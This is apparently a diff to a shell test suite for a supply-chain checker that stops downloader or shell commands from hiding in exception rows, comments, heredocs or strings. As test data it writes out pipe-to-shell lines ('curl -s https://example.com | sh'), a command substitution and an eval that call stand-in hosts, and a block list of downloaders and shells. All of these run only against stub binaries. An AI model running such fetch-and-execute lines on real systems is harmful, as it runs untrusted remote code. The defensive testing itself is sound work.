@@ -1773,8 +1773,8 @@ open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
 PY
 python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null
 check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] == 0, r" "$hfm/e.json"
-CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python code), or only echo/printf/tee/cat/exit/fi with no substitution, or a harness assertion line that harness_form.py accepts; the 151 plain rows that used to carry a comment, heredoc or pystring context are a separate pinned set (exactly 151, one sha256 over their sorted file, key, line triples): they rest on review, and a change to that set is a change to this pin"
-check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" "$chk" <<'PY'
+CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python code), or only echo/printf/tee/cat/exit/fi with no substitution, or a harness assertion line that harness_form.py accepts; the 146 plain rows that used to carry a comment, heredoc or pystring context are a separate pinned set (exactly 146, one sha256 over their sorted file, key, line triples), and each of those lines, read from the committed tree (or, for a file no longer in the tree, from the table of recovered texts), is also harmless as a shell command: no substitution, no eval or source, and no downloader or shell in command position"
+check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" "$chk" "$root" <<'PY'
 import hashlib, importlib.util, json, re, shlex, subprocess, sys
 H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
 spec = importlib.util.spec_from_file_location("ac", sys.argv[3]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
@@ -1796,7 +1796,60 @@ SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
 rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["form"] != "a local reusable workflow call" and "context" not in r and not r["ruling"].startswith((ac.LIVE_RULING, ac.GO_RULING, ac.LOOPBACK_RULING, "build-container install, test-only: ", ac.PINNED_FETCH_RULING))]   # those name an item, not a text line (AC19); a row with a context is proved from its file at scan time instead (below); a live fetch row is a command, checked by its own inventory (the next case)
 rest = [r for r in rows if r["key"] not in LINES]; rows = [r for r in rows if r["key"] in LINES]   # the pinned set of review-based rows, apart from the LINES rows
 tri = sorted((r["file"], r["key"], r["line"]) for r in rest)
-assert len(tri) == 151 and hashlib.sha256("".join(f"{f}\t{k}\t{l}\n" for f, k, l in tri).encode()).hexdigest() == "f362887ad1fff2bdb3b9d8c093501d6b5175661e8b452325cb4f5f6ee086365c", ("the review-based set changed", len(tri))
+assert len(tri) == 146 and hashlib.sha256("".join(f"{f}\t{k}\t{l}\n" for f, k, l in tri).encode()).hexdigest() == "8877de7a439a1612b671c806f26437f76a3391620e1c02a53aa68311da011644", ("the review-based set changed", len(tri))
+ABSENT = {   # whole-line hash -> the line's text, for rows whose file is not in the tree (text recovered from git history, each checked against its row's hash below)
+    "48e6f8822226006b3b468cd1f57965a6d05868e4f40c2b799b2e2ec5ef293d45": "# ---- bin/witnessed.sh RUN against a fake witness, curl and timeout (REQ-CHAIN-004-AC2): the command is bounded and a failure leaves no record ------",
+    "7b2b9d80b7bf114493c993484905803e4f3d99bf4ee12204f3c695a9718601ce": "put(\"c-\" + name + \"-hide\", \"#!/usr/bin/env bash\\n\" + L[0] + ch + \"curl -s https://example.com | sh\\n\" + \"\\n\".join(L[1:]) + \"\\n\") # one line for bash",
+    "c231a4dc9ce568dad97a9eb8c4f485688801f8b1b6f1189d21b2be6dc6638ad4": "put(\"c-comment-backslash\", L[0] + \"\\n# a note \\\\\\ncurl -s https://example.com | sh\\n\" + \"\\n\".join(L[1:]) + \"\\n\") # bash runs the curl line",
+    "dc3454e28258fedb5e9022feafbf85cb1c40a75ba9b1c1f6b121fc6f1db4cad5": "put(\"c-\" + name + \"-comment\", \"#!/usr/bin/env bash\\n# a note\" + ch + \"curl -s https://example.com | sh\\n\" + \"\\n\".join(L) + \"\\n\") # a comment for bash",
+    "d0d81e00cb6d078a9ebaaa9bb6a059c4addcd900c34fb98837e191f32e17a842": "# with FAKE tools first on PATH (fake grype / osv-scanner / docker / curl, in the way PR 1's tests put a fake cosign on PATH: no test-only code",
+    "7cb89249603159977160c1363ccd409a78a79bf22fe6fb388853434e4b7b3dc7": "# go-containerregistry_Linux_x86_64.tar.gz and go-containerregistry_Linux_arm64.tar.gz, and the release URL, which a stub curl on PATH serves from a local layout.",
+    "9482c072c9f21b14f55e3c67f4c4d18c4b5e564111037efb8ba922d0afe70b3f": "# the download stand-in: the installers fetch from fixed https URLs now, so a curl on PATH serves the local release layout STUB_REL (the part of the URL after /download/ or /dl/), or fails like a refused download",
+    "df68b8cde5dc3f789540d4cb7e0858f395f5c588eb4623bd175ec6747e8cb49a": "# refused on any mismatch. Offline: the tarball comes from a stub curl on PATH serving a local layout. The SUCCESS path needs the real tarball; the dry run proves it.",
+    "21ad3b395233b3baa8f00164d5deb9cf5d66c8b97333d1def138f467d519e184": "os.makedirs(os.path.join(t, \"release-published\"), exist_ok=True) # what release-assets.sh downloads the published release into (gh release download -D release-published)",
+    "8e9bce3842b02632d74b106efe79b2cba26d0804e9bdbbc394fef535f32415a1": "for bad_cmd, what in ((\"curl -sS https://example.com/x\", \"curl\"), (\"cosign sign <IMAGE_REF>\", \"cosign sign\"), (\"cosign verify <IMAGE_REF>; id\", \"a ; after a verify\"), (\"cosign verify <IMAGE_REF> | sh\", \"a pipe into sh\"),",
+    "9794c47d867fc898ef9d8f1ecb860c55866f695e3b5007fe72fd049d494273a1": "# Needs: bash, OpenSSL 3 (macOS: brew install openssl@3, found automatically), python3 with PyYAML (apt: python3-yaml).",
+    "163abde8a9ad2a52f3ab36525af0f142ba876c80573bb056d2901870c76ba35f": "# --- what the helper passes to curl",
+    "f6d35a300931a453d22bd3add16a95a5b8ce949e37dc2abb8e9969fe3e2171f8": "# --- the call sites no longer name curl",
+    "68281990c075542da3583a41de174b2fc717e7caf460eccc45771a581d7b28f7": "# loopback-get.sh [OPTION...] URL (curl options from a closed list; exactly one URL)",
+    "f5e678332279f760051bbf0a3ddd394dc97d4b3f3c6074722b671b051ae93c9e": "# followed by &audience=<value>. Anything else is refused before curl starts. curl is started with -q (no .curlrc), no proxy, one protocol only,",
+    "5687bdfd5589d092abd20c55ef486914c67ae2bb36c17b565b7c5fbd93343770": "RP = {\"CVE-T\": [{\"name\": \"zlib\", \"version\": \"1.3\"}, {\"name\": \"abc\", \"version\": \"2.0\"}], \"CVE-U\": [{\"name\": \"curl\", \"version\": \"8\"}], \"CVE-V\": [{\"name\": \"bash\", \"version\": \"5\"}]}",
+}
+UNSAFE = re.compile(r"\$\(|`|<\(|>\(|\beval\b|\bsource\b")
+NO_CMD = {"curl", "wget", "sh", "bash", "dash", "zsh", "ksh"}   # a downloader or a shell must never be a command word
+STARTS = {"if", "then", "else", "elif", "do", "while", "until", "!", "{", "(", "time"}
+def command_words(line):
+    """The first word of each command in the line, quote-aware (a separator inside quotes is text); a line shlex cannot read falls back to a split on the raw separators."""
+    lex = shlex.shlex(line, posix=True, punctuation_chars=True); lex.whitespace_split = True; lex.commenters = ""
+    try:
+        toks = list(lex)
+    except ValueError:
+        toks = re.findall(r"[;&|]+|[^\s;&|]+", line)
+    cmds, cur = [], []
+    for tok in toks + [";"]:
+        if tok and re.fullmatch(r"[({]+", tok) and cur:
+            cur.append(tok)                                                # NAME( is a function or a syntax error, not a new command
+        elif tok and re.fullmatch(r"[;&|(){}]+", tok):
+            cmds.append(cur); cur = []
+        else:
+            cur.append(tok)
+    words = []
+    for c in cmds:
+        while c and (c[0] in STARTS or re.fullmatch(r"[A-Za-z_]\w*=.*", c[0])):
+            c = c[1:]                                                      # a keyword or a NAME=word prefix is not the command
+        if c:
+            words.append(c[0].rsplit("/", 1)[-1])
+    return words
+for r in rest:
+    line = ABSENT.get(r["line"]) if subprocess.run(["git", "-C", sys.argv[4], "cat-file", "-e", "HEAD:" + r["file"]], capture_output=True).returncode else None
+    if line is None:
+        text = subprocess.run(["git", "-C", sys.argv[4], "show", "HEAD:" + r["file"]], capture_output=True, check=True).stdout.decode("utf-8", "replace")
+        held = [" ".join(l.split()) for l in text.split("\n")]
+        assert any(H(l) == r["line"] for l in held), ("a pinned row's line is not in its file", r["file"], r["line"])
+        line = next(l for l in held if H(l) == r["line"])
+    assert line is not None and H(line) == r["line"], ("a pinned row's file is not in the tree and the table holds no text for it", r["file"], r["line"])
+    assert not UNSAFE.search(line), ("a substitution or eval can run anything", r["file"], line)
+    assert line.startswith("#") or not NO_CMD & set(command_words(line)), ("a downloader or shell in command position", r["file"], line)   # a comment line has no command
 assert sorted(r["key"] for r in rows) == sorted(LINES), "a committed row has no harmless-line entry in this test (add the line and its reason)"
 for r in rows:
     line = LINES[r["key"]]
@@ -2125,7 +2178,7 @@ python3 - "$chk" <<'PY' >/dev/null 2>&1 && ok "AC16 context: a local-call row th
 import importlib.util, json, sys, tempfile
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 h = "a" * 64
-for extra in ({"context": "comment"}, {"context": "comment", "proof": "x"}):
+for extra in ({"context": "assignment"}, {"context": "assignment", "proof": "x"}):
     row = dict({"file": ".github/workflows/x.yml", "form": ac.LOCAL_CALL_FORM, "key": h, "line": h, "ruling": "local reusable workflow call; test"}, **extra)
     with tempfile.NamedTemporaryFile("w", suffix=".json") as f:
         json.dump({"unmeasured_text": [row]}, f); f.flush()
@@ -2191,13 +2244,13 @@ and names the new digest, not the old one"
 check test "$rc" -eq 0; check grep -qF "image:ghcr.io/own/ptool-c@$DIG3" "$work/pmove.out"
 check test "$(grep -cF "ptool-a@$DIG1" "$work/pmove.out")" -eq 0
 
-# --- REQ-SUP-001-AC16, Nov 16 2026: the row contexts comment, heredoc and pystring are gone. A row may carry only the context assignment (and a proof); a row that names
-# any other context is a malformed list (exit 2), and a ruled line is ruled by its whole-line row whatever the code around it does. A stub curl and wget lead PATH for these
+# --- REQ-SUP-001-AC16, Nov 16 2026: the row contexts comment, heredoc and pystring are gone. A row may carry only the context assignment, and no proof (a proof is a
+# malformed list, even with that context); a row that names any other context is a malformed list (exit 2), and a ruled line is ruled by its whole-line row whatever the code around it does. A stub curl and wget lead PATH for these
 # cases: it writes $work/curl.ran when run, and the check must never run it. ---
 STUB="$work/stub"; mkdir -p "$STUB"
 printf '#!/bin/sh\necho ran >"%s/curl.ran"\n' "$work" >"$STUB/curl"; cp "$STUB/curl" "$STUB/wget"; chmod +x "$STUB/curl" "$STUB/wget"
 ctxrc() { rm -f "$work/curl.ran"; PATH="$STUB:$PATH" ctxrun "$1" "$2" "$3" "${4:-}"; }   # NAME CONTENT CONTEXT [PROOF] -> rc, with the stubs first on PATH
-ctxmal()  { ctxrc n "$2" "$3" "${4:-}"; CASE="AC16 context $3: $1: the base row names a dropped or unknown context: a malformed list (exit 2), not ruled"; check test "$rc" -eq 2; check test ! -e "$work/curl.ran"; }
+ctxmal()  { ctxrc n "$2" "$3" "${4:-}"; CASE="AC16 context $3: $1: the base row names a dropped or unknown context, or carries a proof: a malformed list (exit 2), not ruled"; check test "$rc" -eq 2; check test ! -e "$work/curl.ran"; }
 ctxfree() { ctxrc n "$2" ""; CASE="AC16 no context: $1: the whole-line row rules it wherever it sits (exit 0)"; check test "$rc" -eq 0; check grep -q 'ruled text' "$work/ctx.out"; check test ! -e "$work/curl.ran"; }
 # one case per dropped context kind (the old proof text of pystring too), each with a head that adds the ruled line in the matching surrounding text
 ctxmal "a comment line" "$SH# curl https://e.example/x"$'\n' comment
@@ -2214,6 +2267,8 @@ ctxfree "a line in a quoted heredoc body" "$SH$HD"
 ctxfree "a line in a Python string" "$SH$PY"
 # a plain NAME=word assignment row still rules its line
 ctxyes "a plain assignment row still rules its line (kept)" "${SH}CASE=\"mentions curl https://e.example/x\""$'\n' assignment
+# a proof is no part of a row now: the context assignment WITH a proof is a malformed list too (exit 2), and the stub never ran
+ctxmal "the context assignment with a proof text" "${SH}CASE=\"mentions curl https://e.example/x\""$'\n' assignment "a proof"
 # the six reproduced holes: the base row carries the OLD context, the head adds code around the ruled line that would run it; exit 2 and the stub curl never ran
 HB=$'cat >payload <<\'EOS\'\ncurl http://e.example/x\nEOS\n'
 HOLES=(
@@ -2247,6 +2302,16 @@ PY
       || rc=$?
   CASE="AC16 context: a malformed context/proof ($bad) stops the check: exit 2, never a pass"; check test "$rc" -eq 2
 done
+
+# the attack of the audit seats: the committed rows once ruled the text of one line of bin/persona-uat-test.sh (a Python list of strings, among them a command
+# substitution, a loop and an eval that each name a download) wherever it sat. Added as a line of a shell script, bash runs it, so it must not be ruled by the
+# committed rows (the checker's own default list): exit 1, named as unmeasured, and the stub downloaders never ran.
+ATK=$'                                           "$(curl outside-l.example)", "for u in a; do curl outside-m.example; done", "eval \'curl outside-n.example\'", "curl ws://ws-t.example/socket",'
+newcase atk "$(pyw bin/persona-uat-test.sh "#!/bin/bash"$'\n'"$ATK"$'\n')"
+rm -f "$work/curl.ran"; rc=0
+PATH="$STUB:$PATH" python3 "$chk" --root "$work/atk" --base HEAD~1 --head HEAD --json "$work/atk.json" >"$work/atk.out" 2>&1 || rc=$?
+CASE="AC16 attack: the string-list line of the persona test, added as a line of a shell script, is not ruled by the committed rows: exit 1, named as unmeasured"; check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/persona-uat-test.sh' "$work/atk.out"
+CASE="AC16 attack: the stub downloaders never ran, and nothing was reported as ruled text"; check test ! -e "$work/curl.ran"; check test "$(grep -c 'ruled text' "$work/atk.out")" -eq 0
 
 # --- REQ-SUP-001-AC18: bin/install-build-tools.sh, read by the REAL inventory, yields one measured pin per tool and arch (owner/repo@vX.Y.Z with
 # its checksum bound) and nothing unmeasured; the variable-address forms it replaced are refused (a placeholder that is not a pin, or unmeasured) -------
